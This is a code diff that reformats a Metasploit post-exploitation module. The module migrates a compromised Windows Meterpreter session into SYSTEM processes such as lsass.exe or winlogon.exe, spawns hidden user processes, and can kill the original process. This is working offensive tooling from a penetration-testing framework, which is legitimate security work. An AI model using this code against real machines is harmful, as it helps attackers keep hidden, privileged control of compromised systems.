@@ -7,46 +7,68 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
 
   DEFAULT_ADMIN_TARGETS = [ 'services.exe', 'wininit.exe', 'svchost.exe', 'lsm.exe', 'lsass.exe', 'winlogon.exe' ]
-  DEFAULT_USER_TARGETS  = [ 'explorer.exe', 'notepad.exe' ]
+  DEFAULT_USER_TARGETS = [ 'explorer.exe', 'notepad.exe' ]
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage Privilege Based Process Migration ',
-      'Description'   => %q{ This module will migrate a Meterpreter session based on session privileges.
-         It will do everything it can to migrate, including spawning a new User level process.
-         For sessions with Admin rights: It will try to migrate into a System level process in the following
-         order: ANAME (if specified), services.exe, wininit.exe, svchost.exe, lsm.exe, lsass.exe, and winlogon.exe.
-         If all these fail and NOFAIL is set to true, it will fall back to User level migration. For sessions with User level rights:
-         It will try to migrate to a user level process, if that fails it will attempt to spawn the process
-         then migrate to it. It will attempt the User level processes in the following order:
-         NAME (if specified), explorer.exe, then notepad.exe.},
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Privilege Based Process Migration ',
+        'Description' => %q{
+          This module will migrate a Meterpreter session based on session privileges.
+          It will do everything it can to migrate, including spawning a new User level process.
+          For sessions with Admin rights: It will try to migrate into a System level process in the following
+          order: ANAME (if specified), services.exe, wininit.exe, svchost.exe, lsm.exe, lsass.exe, and winlogon.exe.
+          If all these fail and NOFAIL is set to true, it will fall back to User level migration. For sessions with User level rights:
+          It will try to migrate to a user level process, if that fails it will attempt to spawn the process
+          then migrate to it. It will attempt the User level processes in the following order:
+          NAME (if specified), explorer.exe, then notepad.exe.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Josh Hale "sn0wfa11" <jhale85446[at]gmail.com>',
           'theLightCosine'
         ],
-      'Platform'      => ['win' ],
-      'SessionTypes'  => ['meterpreter' ]
-    ))
+        'Platform' => ['win' ],
+        'SessionTypes' => ['meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_migrate
+              stdapi_sys_config_getuid
+              stdapi_sys_process_attach
+              stdapi_sys_process_execute
+              stdapi_sys_process_get_processes
+              stdapi_sys_process_kill
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
-        OptString.new('ANAME',  [false, 'System process to migrate to. For sessions with Admin rights. (See Module Description.)']),
-        OptString.new('NAME',   [false, 'Process to migrate to. For sessions with User rights. (See Module Description.)']),
-        OptBool.new(  'KILL',   [true, 'Kill original session process.', false]),
-        OptBool.new(  'NOFAIL', [true,  'Migrate to user level process if Admin migration fails. May downgrade privileged shells.', false])
-      ])
+        OptString.new('ANAME', [false, 'System process to migrate to. For sessions with Admin rights. (See Module Description.)']),
+        OptString.new('NAME', [false, 'Process to migrate to. For sessions with User rights. (See Module Description.)']),
+        OptBool.new('KILL', [true, 'Kill original session process.', false]),
+        OptBool.new('NOFAIL', [true, 'Migrate to user level process if Admin migration fails. May downgrade privileged shells.', false])
+      ]
+    )
   end
 
   def run
     # Get current process information
-    @original_pid  = client.sys.process.open.pid
+    @original_pid = client.sys.process.open.pid
     @original_name = client.sys.process.open.name.downcase
     print_status("Current session process is #{@original_name} (#{@original_pid}) as: #{client.sys.config.getuid}")
     unless migrate_admin
       if is_admin? && !datastore['NOFAIL']
-        print_status("NOFAIL set to false, exiting module.")
+        print_status('NOFAIL set to false, exiting module.')
         return
       end
       migrate_user
@@ -62,7 +84,7 @@ class MetasploitModule < Msf::Post
   def get_pid(proc_name)
     processes = client.sys.process.get_processes
     processes.each do |proc|
-      if proc['name'].downcase == proc_name && proc['user'] != ""
+      if proc['name'].downcase == proc_name && proc['user'] != ''
         return proc['pid']
       end
     end
@@ -78,9 +100,9 @@ class MetasploitModule < Msf::Post
         print_status("Trying to kill original process #{proc_name} (#{proc_pid})")
         session.sys.process.kill(proc_pid)
         print_good("Successfully killed process #{proc_name} (#{proc_pid})")
-      rescue ::Rex::Post::Meterpreter::RequestError => error
+      rescue ::Rex::Post::Meterpreter::RequestError => e
         print_error("Could not kill original process #{proc_name} (#{proc_pid})")
-        print_error(error.to_s)
+        print_error(e.to_s)
       end
     end
   end
@@ -106,13 +128,13 @@ class MetasploitModule < Msf::Post
       client.core.migrate(target_pid)
       print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
       return true
-    rescue ::Rex::Post::Meterpreter::RequestError => req_error
+    rescue ::Rex::Post::Meterpreter::RequestError => e
       print_error("Could not migrate to #{proc_name}.")
-      print_error(req_error.to_s)
+      print_error(e.to_s)
       return false
-    rescue ::Rex::RuntimeError => run_error
+    rescue ::Rex::RuntimeError => e
       print_error("Could not migrate to #{proc_name}.")
-      print_error(run_error.to_s)
+      print_error(e.to_s)
       return false
     end
   end
@@ -129,15 +151,15 @@ class MetasploitModule < Msf::Post
       admin_targets.map!(&:downcase)
 
       if is_system?
-        print_status("Session is already Admin and System.")
+        print_status('Session is already Admin and System.')
         if admin_targets.include? @original_name
           print_good("Session is already in target process: #{@original_name}.")
           return true
         end
       else
-        print_status("Session is Admin but not System.")
+        print_status('Session is Admin but not System.')
       end
-      print_status("Will attempt to migrate to specified System level process.")
+      print_status('Will attempt to migrate to specified System level process.')
 
       # Try to migrate to each of the System level processes in the list.  Stop when one works.  Go to User level migration if none work.
       admin_targets.each do |target_name|
@@ -146,9 +168,9 @@ class MetasploitModule < Msf::Post
           return true
         end
       end
-      print_error("Unable to migrate to any of the System level processes.")
+      print_error('Unable to migrate to any of the System level processes.')
     else
-      print_status("Session has User level rights.")
+      print_status('Session has User level rights.')
     end
     false
   end
@@ -163,7 +185,7 @@ class MetasploitModule < Msf::Post
     user_targets.unshift(datastore['NAME']) if datastore['NAME']
     user_targets.map!(&:downcase)
 
-    print_status("Will attempt to migrate to a User level process.")
+    print_status('Will attempt to migrate to a User level process.')
 
     # Try to migrate to user level processes in the list.  If it does not exist or cannot migrate, try spawning it then migrating.
     user_targets.each do |target_name|
@@ -185,16 +207,13 @@ class MetasploitModule < Msf::Post
   # @return [Integer] the PID if the process spawned successfully
   # @return [NilClass] if the spawn failed
   def spawn(proc_name)
-    begin
-      print_status("Attempting to spawn #{proc_name}")
-      proc = session.sys.process.execute(proc_name, nil, {'Hidden' => true })
-      print_good("Successfully spawned #{proc_name}")
-      return proc.pid
-    rescue ::Rex::Post::Meterpreter::RequestError => error
-      print_error("Could not spawn #{proc_name}.")
-      print_error(error.to_s)
-      return nil
-    end
+    print_status("Attempting to spawn #{proc_name}")
+    proc = session.sys.process.execute(proc_name, nil, { 'Hidden' => true })
+    print_good("Successfully spawned #{proc_name}")
+    return proc.pid
+  rescue ::Rex::Post::Meterpreter::RequestError => e
+    print_error("Could not spawn #{proc_name}.")
+    print_error(e.to_s)
+    return nil
   end
 end
-
